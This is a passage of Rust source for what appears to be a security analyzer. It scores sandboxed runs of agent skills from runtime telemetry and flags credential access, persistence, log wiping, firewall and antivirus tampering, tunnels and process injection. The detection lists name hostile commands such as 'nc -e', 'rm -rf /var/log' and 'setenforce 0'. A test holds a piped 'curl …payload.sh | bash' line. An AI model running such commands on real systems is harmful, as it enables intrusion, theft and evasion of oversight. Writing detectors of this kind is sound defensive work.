                    keys.extend(opened.iter().cloned());
                }
            }
        }
        keys.sort();
        keys.dedup();
        keys
    }

    fn merge_file_taint(&mut self, keys: &[String], taint: &Taint) {
        for key in keys {
            self.files.entry(key.clone()).or_default().merge(taint);
        }
    }

    fn combined_file_taint(&self, keys: &[String]) -> Taint {
        let mut combined = Taint::default();
        for key in keys {
            if let Some(taint) = self.files.get(key) {
                combined.merge(taint);
            }
        }
        combined
    }

    fn merge_files_into_process(&mut self, pid: i64, keys: &[String]) {
        let combined = self.combined_file_taint(keys);
        self.process_mut(pid).taint.merge(&combined);
    }

    fn finish(self, event_count: usize, malformed_lines: usize, force_partial: bool) -> Analysis {
        let output_truncated = self.output_truncated;
        let unknown_platform_count = self.unknown_platforms.len() as u64;
        let findings = self.findings.into_values().collect::<Vec<_>>();
        let coverage = if event_count == 0 {
            "unavailable"
        } else if malformed_lines > 0 || output_truncated || force_partial {
            "partial"
        } else {
            "complete"
        };
        Analysis {
            assessment: assessment(
                self.run,
                &self.analyzer.policy,
                &self.analyzer.discovery.version,
                &findings,
                coverage,
                unknown_platform_count,
            ),
            findings,
            platform_evidence: self.platform_evidence.into_values().collect(),
            platform_candidates: self.platform_candidates.into_values().collect(),
        }
    }
}

fn assessment(
    run: &RunRecord,
    policy: &Policy,
    discovery_version: &str,
    findings: &[FindingRecord],
    coverage: &str,
    unknown_platform_count: u64,
) -> AssessmentRecord {
    let confidentiality = findings
        .iter()
        .filter(|finding| finding.category == "confidentiality")
        .count();
    let integrity = findings
        .iter()
        .filter(|finding| finding.category == "integrity")
        .count();
    let behavioral = findings
        .iter()
        .filter(|finding| finding.category == "behavioral")
        .count();
    let (max_severity, risk_score) = findings
        .iter()
        .map(|finding| severity_score(&finding.severity))
        .max_by_key(|(_, score)| *score)
        .unwrap_or(("none", 0));
    let verdict = if matches!(coverage, "unavailable" | "no_ebpf") {
        "unknown"
    } else if risk_score >= 75 {
        "malicious"
    } else if risk_score > 0 {
        "suspicious"
    } else if coverage != "complete" {
        "unknown"
    } else {
        "benign"
    };
    AssessmentRecord {
        schema_version: SCHEMA_VERSION,
        assessment_id: stable_id("assessment", &[&run.run_id]),
        run_id: run.run_id.clone(),
        skill_id: run.skill_id.clone(),
        verdict: verdict.into(),
        risk_score: f64::from(risk_score),
        max_severity: max_severity.into(),
        confidentiality_findings: confidentiality as u64,
        integrity_findings: integrity as u64,
        behavioral_findings: behavioral as u64,
        unknown_platform_interaction: unknown_platform_count > 0,
        unknown_platform_count,
        coverage_state: coverage.into(),
        policy_version: policy.version.clone(),
        analyzer_version: format!("{}+{discovery_version}", env!("CARGO_PKG_VERSION")),
        assessed_at: run.evidence_time(),
    }
}

fn severity_score(severity: &str) -> (&'static str, u8) {
    match severity.to_ascii_lowercase().as_str() {
        "critical" => ("critical", 100),
        "high" => ("high", 80),
        "medium" => ("medium", 50),
        "low" => ("low", 20),
        _ => ("none", 0),
    }
}

fn resolve_telemetry_path(value: Option<&str>, runs_csv: &Path) -> PathBuf {
    let path = PathBuf::from(value.unwrap_or_default());
    if path.is_absolute() || path.exists() {
        return path;
    }
    let beside_ledger = runs_csv
        .parent()
        .unwrap_or_else(|| Path::new("."))
        .join(&path);
    if beside_ledger.exists() {
        return beside_ledger;
    }
    runs_csv
        .parent()
        .and_then(Path::parent)
        .unwrap_or_else(|| Path::new("."))
        .join(path)
}

fn event_path(event: &NormalizedEvent) -> Option<String> {
    let path = arg_string(
        event,
        &[
            "pathname",
            "cmdpath",
            "command_path",
            "path",
            "file_path",
            "filename",
            "executable",
            "binary",
            // For rename events the destination is the mutation sink. The
            // source path is handled separately to carry inode/path taint.
            "newpath",
            "new_path",
            "newname",
        ],
    )
    .filter(|path| path.starts_with('/'));
    // Tracee represents one anonymous/non-path-backed runtime descriptor as a
    // resolved pathname of "/" paired with an explicitly empty syscall path.
    // Suppress only that exact sentinel; empty or relative syscall paths can
    // accompany legitimate resolved absolute paths and must retain provenance.
    if event.name.eq_ignore_ascii_case("security_file_open")
        && path.as_deref() == Some("/")
        && arg_string(event, &["syscall_pathname"]).as_deref() == Some("")
    {
        None
    } else {
        path
    }
}

fn arg_value<'a>(event: &'a NormalizedEvent, names: &[&str]) -> Option<&'a Value> {
    names.iter().find_map(|name| {
        event.args.get(*name).or_else(|| {
            event
                .args
                .iter()
                .find(|(key, _)| key.eq_ignore_ascii_case(name))
                .map(|(_, value)| value)
        })
    })
}

fn arg_string(event: &NormalizedEvent, names: &[&str]) -> Option<String> {
    let value = arg_value(event, names)?;
    match value {
        Value::String(value) => Some(value.clone()),
        Value::Number(value) => Some(value.to_string()),
        Value::Array(_) | Value::Object(_) => Some(flatten_strings(value)),
        Value::Bool(value) => Some(value.to_string()),
        Value::Null => None,
    }
}

fn arg_i64(event: &NormalizedEvent, names: &[&str]) -> Option<i64> {
    let value = arg_value(event, names)?;
    value
        .as_i64()
        .or_else(|| value.as_u64().and_then(|value| i64::try_from(value).ok()))
        .or_else(|| value.as_str().and_then(|value| value.parse().ok()))
}

fn arg_i64s(event: &NormalizedEvent, names: &[&str]) -> Vec<i64> {
    fn collect(value: &Value, output: &mut Vec<i64>) {
        match value {
            Value::Number(value) => {
                if let Some(value) = value.as_i64() {
                    output.push(value);
                }
            }
            Value::String(value) => {
                output.extend(
                    value
                        .split(|character: char| !character.is_ascii_digit() && character != '-')
                        .filter(|value| !value.is_empty())
                        .filter_map(|value| value.parse::<i64>().ok()),
                );
            }
            Value::Array(values) => {
                for value in values {
                    collect(value, output);
                }
            }
            Value::Object(values) => {
                for value in values.values() {
                    collect(value, output);
                }
            }
            Value::Bool(_) | Value::Null => {}
        }
    }

    let mut output = Vec::new();
    if let Some(value) = arg_value(event, names) {
        collect(value, &mut output);
    }
    output
}

fn open_writes(event: &NormalizedEvent) -> bool {
    let flags = arg_string(event, &["flags", "open_flags", "mode"])
        .unwrap_or_default()
        .to_ascii_uppercase();
    flags.contains("O_WRONLY")
        || flags.contains("O_RDWR")
        || flags.contains("O_CREAT")
        || flags.contains("O_TRUNC")
        || flags
            .parse::<u64>()
            .is_ok_and(|flags| flags & 0b11 != 0 || flags & 0o100 != 0)
}

fn path_key(path: &str) -> String {
    format!("path:{}", path.trim_end_matches('/'))
}

fn is_skill_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.ends_with("/skill.md")
        || lower == "/skill"
        || lower.starts_with("/skill/")
        || lower == "/skills"
        || lower.starts_with("/skills/")
        || lower.starts_with("/workspace/skill/")
        || lower == "/work/skill"
        || lower.starts_with("/work/skill/")
        || lower.starts_with("/opt/skill/")
        || lower.contains("/skills/")
}

fn normalized_path(path: &str) -> String {
    path.trim_end_matches('/').to_ascii_lowercase()
}

fn path_is(path: &str, exact: &[&str], prefixes: &[&str]) -> bool {
    let path = normalized_path(path);
    exact.iter().any(|candidate| path == *candidate)
        || prefixes.iter().any(|prefix| {
            path == prefix.trim_end_matches('/')
                || path.starts_with(&format!("{}/", prefix.trim_end_matches('/')))
        })
}

fn is_sensitive_configuration_path(path: &str) -> bool {
    path_is(
        path,
        &[
            "/etc/hosts",
            "/etc/hostname",
            "/etc/resolv.conf",
            "/etc/nsswitch.conf",
            "/etc/ssh/ssh_config",
            "/etc/ssh/sshd_config",
        ],
        &[
            "/etc/ssh/ssh_config.d",
            "/etc/ssh/sshd_config.d",
            "/etc/network",
            "/etc/netplan",
            "/etc/systemd/resolved.conf.d",
            "/home/detonator/.ssh",
            "/home/detonator/.aws",
            "/home/detonator/.config/gcloud",
        ],
    )
}

fn is_auth_material_path(path: &str) -> bool {
    let lower = normalized_path(path);
    path_is(
        &lower,
        &[
            "/etc/passwd",
            "/etc/shadow",
            "/etc/group",
            "/etc/gshadow",
            "/etc/sudoers",
            "/etc/security/access.conf",
            "/etc/krb5.conf",
        ],
        &[
            "/etc/sudoers.d",
            "/etc/pam.d",
            "/etc/krb5.keytab.d",
            "/etc/ssl/private",
            "/etc/pki",
            "/usr/local/share/ca-certificates",
            "/etc/ca-certificates",
        ],
    ) || lower.ends_with("/authorized_keys")
        || lower.ends_with("/authorized_keys2")
        || lower.ends_with("/.env")
        || lower.contains("/.ssh/id_")
        || lower.contains("/.aws/credentials")
        || lower.contains("/.config/gcloud/")
        || lower.contains("credential")
        || lower.contains("access_token")
}

fn is_scheduled_task_path(path: &str) -> bool {
    path_is(
        path,
        &["/etc/crontab", "/etc/anacrontab"],
        &[
            "/etc/cron.d",
            "/etc/cron.hourly",
            "/etc/cron.daily",
            "/etc/cron.weekly",
            "/etc/cron.monthly",
            "/var/spool/cron",
            "/var/spool/at",
            "/etc/systemd/system",
            "/home/detonator/.config/systemd/user",
        ],
    )
}

fn is_startup_path(path: &str) -> bool {
    let lower = normalized_path(path);
    path_is(
        &lower,
        &["/etc/rc.local", "/etc/ld.so.preload"],
        &[
            "/etc/init.d",
            "/etc/rc0.d",
            "/etc/rc1.d",
            "/etc/rc2.d",
            "/etc/rc3.d",
            "/etc/rc4.d",
            "/etc/rc5.d",
            "/etc/rc6.d",
            "/etc/systemd/system",
            "/usr/lib/systemd/system",
            "/home/detonator/.config/autostart",
        ],
    ) || lower.ends_with("/.profile")
        || lower.ends_with("/.bash_profile")
        || lower.ends_with("/.bashrc")
        || lower.ends_with("/.zshrc")
}

fn is_log_or_forensic_path(path: &str) -> bool {
    let lower = normalized_path(path);
    path_is(
        &lower,
        &["/etc/audit/auditd.conf", "/etc/systemd/journald.conf"],
        &[
            "/var/log",
            "/var/lib/systemd/coredump",
            "/var/lib/systemd/catalog",
            "/etc/audit/rules.d",
            "/etc/rsyslog.d",
            "/etc/systemd/journald.conf.d",
        ],
    ) || lower.ends_with("/.bash_history")
        || lower.ends_with("/.zsh_history")
        || lower.ends_with("/.python_history")
}

fn is_security_policy_path(path: &str) -> bool {
    path_is(
        path,
        &[
            "/etc/selinux/config",
            "/etc/default/ufw",
            "/etc/firewalld/firewalld.conf",
        ],
        &[
            "/etc/selinux",
            "/etc/apparmor.d",
            "/etc/nftables",
            "/etc/firewalld",
            "/etc/ufw",
            "/etc/audit/rules.d",
        ],
    )
}

fn is_update_or_protection_path(path: &str) -> bool {
    path_is(
        path,
        &[
            "/etc/apt/sources.list",
            "/etc/apt/apt.conf",
            "/etc/yum.conf",
            "/etc/dnf/dnf.conf",
        ],
        &[
            "/etc/apt/sources.list.d",
            "/etc/apt/apt.conf.d",
            "/etc/yum.repos.d",
            "/etc/dnf",
            "/var/lib/dpkg",
            "/var/lib/rpm",
            "/etc/clamav",
            "/etc/falco",
            "/etc/osquery",
        ],
    )
}

fn contains_any(value: &str, indicators: &[&str]) -> bool {
    indicators.iter().any(|indicator| value.contains(indicator))
}

fn is_scheduled_task_command(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            " crontab ",
            "/usr/bin/crontab",
            " systemctl enable ",
            " systemctl --user enable ",
            " schtasks ",
            " register-scheduledtask ",
            " at.exe ",
        ],
    )
}

fn is_dangerous_network_action(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            "ngrok",
            "localtunnel",
            "serveo.net",
            "trycloudflare.com",
            "cloudflared tunnel",
            "chisel client",
            "ssh -r ",
            "socat tcp",
            "nc -e ",
            "ncat -e ",
        ],
    )
}

fn is_update_tamper_command(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            "systemctl disable unattended-upgrades",
            "systemctl mask unattended-upgrades",
            "apt-mark hold",
            "dnf versionlock",
            "yum versionlock",
            "set-mppreference -disablerealtimemonitoring",
            "stop-service wuauserv",
            "sc.exe config wuauserv start= disabled",
            "systemctl disable falco",
            "systemctl stop falco",
            "systemctl disable osquery",
            "systemctl stop osquery",
            "systemctl disable auditd",
            "systemctl stop auditd",
        ],
    )
}

fn is_startup_command(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            "systemctl enable ",
            "update-rc.d ",
            "chkconfig ",
            "launchctl load ",
            "new-service ",
            "sc.exe create ",
            "reg add hkcu\\software\\microsoft\\windows\\currentversion\\run",
            "reg add hklm\\software\\microsoft\\windows\\currentversion\\run",
        ],
    )
}

fn is_forensic_tamper_command(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            "journalctl --rotate",
            "journalctl --vacuum",
            "auditctl -e 0",
            "systemctl stop auditd",
            "systemctl disable auditd",
            "wevtutil cl ",
            "clear-eventlog",
            "rm -rf /var/log",
            "truncate -s 0 /var/log",
            "history -c",
            "unset histfile",
        ],
    )
}

fn is_privilege_elevation_command(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            " sudo ",
            "/usr/bin/sudo",
            " pkexec ",
            "/usr/bin/pkexec",
            " setcap ",
            " chmod u+s ",
            " chmod 4",
            " chown root ",
            " runas ",
            " start-process -verb runas",
            " token::elevate",
        ],
    )
}

fn is_security_policy_command(evidence: &str) -> bool {
    contains_any(
        evidence,
        &[
            "iptables ",
            "ip6tables ",
            "nft ",
            "ufw disable",
            "firewall-cmd ",
            "setenforce 0",
            "semanage ",
            "apparmor_parser -r",
            "aa-disable ",
            "auditctl ",
            "set-netfirewallprofile",
            "new-netfirewallrule",
            "set-ruleoption",
            "applocker",
            "wdac",
        ],
    )
}

fn is_process_injection_event(event: &NormalizedEvent, evidence: &str) -> bool {
    let name = event.name.to_ascii_lowercase();
    matches!(
        name.as_str(),
        "ptrace" | "process_vm_writev" | "process_vm_readv" | "memfd_create" | "kexec_file_load"
    ) || ((name == "mprotect" || name == "mmap" || name == "mmap2")
        && contains_any(evidence, &["prot_exec", "prot_write|prot_exec", "rwx"]))
        || evidence.contains("/proc/")
            && (evidence.contains("/mem") || evidence.contains("/pagemap"))
        || evidence.contains("ld_preload")
        || evidence.contains("create_remote_thread")
        || evidence.contains("writeprocessmemory")
        || evidence.contains("ntmapviewofsection")
}

fn is_privilege_elevation_event(event: &NormalizedEvent, evidence: &str) -> bool {
    matches!(
        event.name.to_ascii_lowercase().as_str(),
        "setuid"
            | "setgid"
            | "setreuid"
            | "setregid"
            | "setresuid"
            | "setresgid"
            | "capset"
            | "unshare"
    ) || (event.name.eq_ignore_ascii_case("chmod")
        && contains_any(evidence, &["s_isuid", "s_isgid", "04755", "06755"]))
}

fn is_local_or_lan_host(host: &str) -> bool {
    let normalized = normalize_domain(host)
        .trim_matches(['[', ']'])
        .trim_end_matches('.')
        .to_string();
    if normalized.is_empty() {
        return true;
    }
    let host_without_zone = normalized.split('%').next().unwrap_or(&normalized);
    match host_without_zone.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(address)) => is_local_or_lan_ipv4(address),
        Ok(std::net::IpAddr::V6(address)) => {
            address.is_loopback()
                || address.is_unspecified()
                || address.is_multicast()
                || (address.segments()[0] & 0xfe00) == 0xfc00
                || (address.segments()[0] & 0xffc0) == 0xfe80
                || address.to_ipv4_mapped().is_some_and(is_local_or_lan_ipv4)
        }
        Err(_) => {
            normalized == "localhost"
                || !normalized.contains('.')
                || normalized.ends_with(".localhost")
                || normalized.ends_with(".local")
                || normalized.ends_with(".lan")
                || normalized.ends_with(".home")
                || normalized.ends_with(".home.arpa")
                || normalized.ends_with(".internal")
                || normalized.ends_with(".localdomain")
        }
    }
}

fn is_local_or_lan_ipv4(address: std::net::Ipv4Addr) -> bool {
    let [first, second, ..] = address.octets();
    address.is_private()
        || address.is_loopback()
        || address.is_link_local()
        || address.is_unspecified()
        || address.is_broadcast()
        || address.is_multicast()
        || first == 0
        || (first == 100 && (second & 0xc0) == 64)
        || (first == 198 && matches!(second, 18 | 19))
}

fn command_uses_network_tool(evidence: &str) -> bool {
    let lower = evidence.to_ascii_lowercase();
    ["curl", "wget", "fetch", "powershell", "httpie"]
        .iter()
        .any(|tool| {
            lower
                .split(|character: char| !character.is_alphanumeric())
                .any(|word| word == *tool)
        })
}

fn is_shell_exec(event: &NormalizedEvent) -> bool {
    let path = event_path(event).unwrap_or_default().to_ascii_lowercase();
    let name = event.name.to_ascii_lowercase();
    ["sh", "bash", "zsh", "dash"].iter().any(|shell| {
        name == *shell || path == format!("/bin/{shell}") || path == format!("/usr/bin/{shell}")
    })
}

fn chain_observations_close(left: &ChainObservation, right: &ChainObservation) -> bool {
    match (left.timestamp, right.timestamp) {
        (Some(left), Some(right)) => left.abs_diff(right) <= 5_000_000_000,
        _ => left.seq.abs_diff(right.seq) <= 64,
    }
}

fn command_downloads_and_executes_same_path(evidence: &str) -> bool {
    let lower = evidence.to_ascii_lowercase();
    let Some(output) = output_path_tokens(&lower) else {
        return false;
    };
    let Some(position) = lower.find(&output) else {
        return false;
    };
    lower[position + output.len()..].contains(&output)
}

fn download_output_path(evidence: &str, urls: &[(String, String)]) -> Option<(String, String)> {
    let path = output_path_tokens(evidence)?;
    let url = urls.first()?.0.clone();
    Some((path, url))
}

fn output_path_tokens(command: &str) -> Option<String> {
    let tokens = command
        .split_whitespace()
        .map(|token| token.trim_matches(|character| "'\";,".contains(character)))
        .collect::<Vec<_>>();
    for (index, token) in tokens.iter().enumerate() {
        if matches!(*token, "-o" | "-O" | "--output" | "--output-document") {
            if let Some(path) = tokens.get(index + 1).filter(|path| path.starts_with('/')) {
                return Some((*path).to_string());
            }
        }
        if let Some(path) = token.strip_prefix("--output=") {
            if path.starts_with('/') {
                return Some(path.to_string());
            }
        }
    }
    None
}

fn event_domains(event: &NormalizedEvent, urls: &[(String, String)]) -> Vec<String> {
    let mut domains = urls
        .iter()
        .map(|(_, domain)| domain.clone())
        .collect::<Vec<_>>();
    for (key, value) in &event.args {
        let key = key.to_ascii_lowercase();
        if key.contains("domain")
            || key.contains("query")
            || key.contains("hostname")
            || key.contains("remote_addr")
            || key == "dst"
        {
            push_domain_tokens(&flatten_strings(value), &mut domains);
        }
    }
    if event.kind == EventKind::Dns {
        for value in event.args.values() {
            collect_structured_dns_hostnames(value, &mut domains);
        }
    }
    domains.retain(|domain| !domain.is_empty());
    domains.sort();
    domains.dedup();
    domains
}

fn collect_structured_dns_hostnames(value: &Value, domains: &mut Vec<String>) {
    match value {
        Value::Array(values) => {
            for value in values {
                collect_structured_dns_hostnames(value, domains);
            }
        }
        Value::Object(values) => {
            for (key, value) in values {
                if dns_hostname_field(key) {
                    collect_dns_hostname_value(value, domains);
                } else if matches!(value, Value::Array(_) | Value::Object(_)) {
                    collect_structured_dns_hostnames(value, domains);
                }
            }
        }
        Value::String(_) | Value::Number(_) | Value::Bool(_) | Value::Null => {}
    }
}

fn collect_dns_hostname_value(value: &Value, domains: &mut Vec<String>) {
    match value {
        Value::String(value) => push_domain_tokens(value, domains),
        Value::Array(values) => {
            for value in values {
                collect_dns_hostname_value(value, domains);
            }
        }
        Value::Object(_) => collect_structured_dns_hostnames(value, domains),
        Value::Number(_) | Value::Bool(_) | Value::Null => {}
    }
}

fn dns_hostname_field(key: &str) -> bool {
    matches!(
        key.to_ascii_lowercase().as_str(),
        "name"
            | "qname"
            | "query"
            | "domain"
            | "hostname"
            | "host"
            | "cname"
            | "ns"
            | "ptr"
            | "mname"
            | "rname"
            | "target"
            | "exchange"
    )
}

fn push_domain_tokens(value: &str, domains: &mut Vec<String>) {
    for token in value.split_whitespace() {
        let token = token
            .trim_matches(|character: char| {
                !character.is_ascii_alphanumeric()
                    && character != '.'
                    && character != '-'
                    && character != ':'
            })
            .split(':')
            .next()
            .unwrap_or_default();
        if token.contains('.') && !token.is_empty() && !token.contains('/') {
            domains.push(normalize_domain(token));
        }
    }
}

fn candidate_platform(
    platform_id: &str,
    domain: &str,
    url: &str,
    confidence: f64,
    seen_at: &str,
) -> PlatformRecord {
    PlatformRecord {
        schema_version: SCHEMA_VERSION,
        platform_id: platform_id.into(),
        display_name: domain.into(),
        canonical_domain: domain.into(),
        base_url: format!("https://{domain}"),
        ingest_uri: String::new(),
        adapter: String::new(),
        status: "candidate".into(),
        enabled: false,
        discovery_method: "runtime_telemetry".into(),
        confidence,
        first_seen_at: Some(seen_at.into()),
        last_seen_at: Some(seen_at.into()),
        rate_limit_per_minute: None,
        terms_url: None,
        evidence_url: Some(url.into()),
        notes: Some(
            "High-confidence runtime candidate; requires human review before ingestion".into(),
        ),
    }
}

fn merge_candidate_observation(current: &mut PlatformRecord, incoming: &PlatformRecord) {
    if incoming.last_seen_at > current.last_seen_at {
        current.last_seen_at.clone_from(&incoming.last_seen_at);
    }
    if current.first_seen_at.is_none()
        || incoming
            .first_seen_at
            .as_ref()
            .zip(current.first_seen_at.as_ref())
            .is_some_and(|(incoming, current)| incoming < current)
    {
        current.first_seen_at.clone_from(&incoming.first_seen_at);
    }
    current.confidence = current.confidence.max(incoming.confidence);
    if current.evidence_url.is_none()
        || incoming
            .evidence_url
            .as_ref()
            .zip(current.evidence_url.as_ref())
            .is_some_and(|(incoming, current)| incoming < current)
    {
        current.evidence_url.clone_from(&incoming.evidence_url);
    }
}

fn candidate_dns_hostname(domain: &str) -> bool {
    if domain.is_empty()
        || domain.len() > 253
        || !domain.contains('.')
        || domain
            .trim_matches(['[', ']'])
            .parse::<std::net::IpAddr>()
            .is_ok()
    {
        return false;
    }
    domain.split('.').all(|label| {
        !label.is_empty()
            && label.len() <= 63
            && label
                .bytes()
                .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
            && label
                .as_bytes()
                .first()
                .is_some_and(u8::is_ascii_alphanumeric)
            && label
                .as_bytes()
                .last()
                .is_some_and(u8::is_ascii_alphanumeric)
    })
}

fn csv_safe_evidence(value: &str, max_bytes: usize) -> String {
    let mut normalized = String::with_capacity(value.len().min(max_bytes));
    for character in value.chars() {
        if character.is_control() {
            normalized.extend(character.escape_default());
        } else {
            normalized.push(character);
        }
    }
    if normalized.is_empty() {
        normalized.push_str("<empty>");
    }
    if normalized
        .trim_start_matches(char::is_whitespace)
        .starts_with(['=', '+', '-', '@'])
    {
        normalized.insert(0, '\'');
    }
    truncate_utf8_bytes(&normalized, max_bytes)
}

fn truncate_utf8_bytes(value: &str, max_bytes: usize) -> String {
    if value.len() <= max_bytes {
        return value.to_owned();
    }
    let mut end = max_bytes;
    while !value.is_char_boundary(end) {
        end -= 1;
    }
    value[..end].to_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn output_path_parser_handles_curl_and_wget_forms() {
        assert_eq!(
            output_path_tokens("curl https://x/a -o /tmp/tool"),
            Some("/tmp/tool".into())
        );
        assert_eq!(
            output_path_tokens("wget --output=/tmp/tool https://x/a"),
            Some("/tmp/tool".into())
        );
    }

    #[test]
    fn security_file_open_ignores_anonymous_root_placeholder() {
        let mut event = NormalizedEvent {
            name: "security_file_open".into(),
            ..NormalizedEvent::default()
        };
        event
            .args
            .insert("pathname".into(), Value::String("/".into()));
        event
            .args
            .insert("syscall_pathname".into(), Value::String(String::new()));
        assert_eq!(event_path(&event), None);

        event
            .args
            .insert("syscall_pathname".into(), Value::String("/".into()));
        assert_eq!(event_path(&event), Some("/".into()));

        event.args.insert(
            "pathname".into(),
            Value::String("/var/lib/apt/lists".into()),
        );
        event
            .args
            .insert("syscall_pathname".into(), Value::String(String::new()));
        assert_eq!(event_path(&event), Some("/var/lib/apt/lists".into()));

        event.args.insert(
            "pathname".into(),
            Value::String("/etc/cron.d/persist".into()),
        );
        event
            .args
            .insert("syscall_pathname".into(), Value::String("persist".into()));
        assert_eq!(event_path(&event), Some("/etc/cron.d/persist".into()));

        event.args.remove("syscall_pathname");
        assert_eq!(event_path(&event), Some("/etc/cron.d/persist".into()));
    }

    #[test]
    fn generic_curl_url_does_not_qualify_as_platform_by_itself() {
        let discovery = DiscoveryConfig {
            version: "test-v1".into(),
            threshold: 0.70,
            domain_indicators: vec!["skill".into()],
            path_indicators: vec!["/skills/".into()],
            command_indicators: vec!["install skill".into()],
            ignored_domains: Vec::new(),
        };
        let policy = Policy::load_or_default(Path::new("definitely-absent-policy.toml")).unwrap();
        let analyzer = Analyzer::new(policy, discovery, &[]).unwrap();
        assert!(
            analyzer
                .urls("curl https://updates.example/payload.sh | bash")
                .len()
                == 1
        );
        assert!(!"updates.example".contains("skill"));
    }

    #[test]
    fn candidate_domains_are_normalized_dns_names_not_ip_literals() {
        assert!(candidate_dns_hostname("newskillshare.example"));
        assert!(candidate_dns_hostname("xn--bcher-kva.example"));
        assert!(!candidate_dns_hostname("skillsissue-relay"));
        assert!(!candidate_dns_hostname("localhost"));
        assert!(!candidate_dns_hostname("192.0.2.10"));
        assert!(!candidate_dns_hostname("[2001:db8::1]"));
        assert!(!candidate_dns_hostname("bad_label.example"));
        assert!(!candidate_dns_hostname("-bad.example"));
    }

    #[test]
    fn local_and_lan_hosts_are_not_remote_risk_destinations() {
        for host in [
            "localhost",
            "worker.internal",
            "printer.local",
            "10.20.30.40",
            "172.16.10.2",
            "192.168.1.10",
            "127.0.0.1",
            "100.64.0.1",
            "198.18.0.1",
            "::1",
            "fe80::1",
            "fd00::1",
            "::ffff:192.168.1.10",
        ] {
            assert!(is_local_or_lan_host(host), "{host}");
        }
        assert!(!is_local_or_lan_host("api.openai.com"));
        assert!(!is_local_or_lan_host("8.8.8.8"));
        assert!(!is_local_or_lan_host("2606:4700:4700::1111"));
    }

    #[test]
    fn compromise_path_taxonomy_covers_requested_controls() {
        assert!(is_sensitive_configuration_path("/etc/resolv.conf"));
        assert!(is_auth_material_path("/etc/shadow"));
        assert!(is_auth_material_path(
            "/home/detonator/.ssh/authorized_keys"
        ));
        assert!(is_scheduled_task_path("/etc/cron.d/persist"));
        assert!(is_startup_path("/etc/systemd/system/persist.service"));
        assert!(is_log_or_forensic_path("/var/log/audit/audit.log"));
        assert!(is_security_policy_path("/etc/apparmor.d/usr.bin.tool"));
        assert!(is_update_or_protection_path(
            "/etc/apt/sources.list.d/security.list"
        ));
        assert!(is_dangerous_network_action(
            "crontab -l; curl https://example.ngrok.io"
        ));
    }

    #[test]
    fn dns_domains_use_structured_host_fields_not_flattened_tracee_types() {
        let mut event = NormalizedEvent {
            kind: EventKind::Dns,
            evidence: "trace.PacketMetadata trace.ProtoDNS should.not.be.used".into(),
            ..NormalizedEvent::default()
        };
        event.args.insert(
            "metadata".into(),
            serde_json::json!({"direction": 1, "type": "trace.PacketMetadata"}),
        );
        event.args.insert(
            "proto_dns".into(),
            serde_json::json!({
                "type": "trace.ProtoDNS",
                "questions": [{"name": "Queried.Example.", "type": "A"}],
                "answers": [{
                    "name": "queried.example.",
                    "CNAME": "edge.example.",
                    "IP": "192.0.2.10"
                }]
            }),
        );

        assert_eq!(
            event_domains(&event, &[]),
            vec!["edge.example".to_string(), "queried.example".to_string()]
        );
    }

    #[test]
    fn finding_evidence_is_formula_safe_control_free_and_byte_bounded() {
        let hostile = format!("  =HYPERLINK(\"x\")\n{}", "💣".repeat(1_000));
        let normalized = csv_safe_evidence(&hostile, 2_048);
        assert!(normalized.len() <= 2_048);
        assert!(normalized.is_char_boundary(normalized.len()));
        assert!(!normalized.chars().any(char::is_control));
        assert!(!normalized
            .trim_start_matches(char::is_whitespace)
            .starts_with(['=', '+', '-', '@']));
        assert!(normalized.contains("\\n"));
    }
}
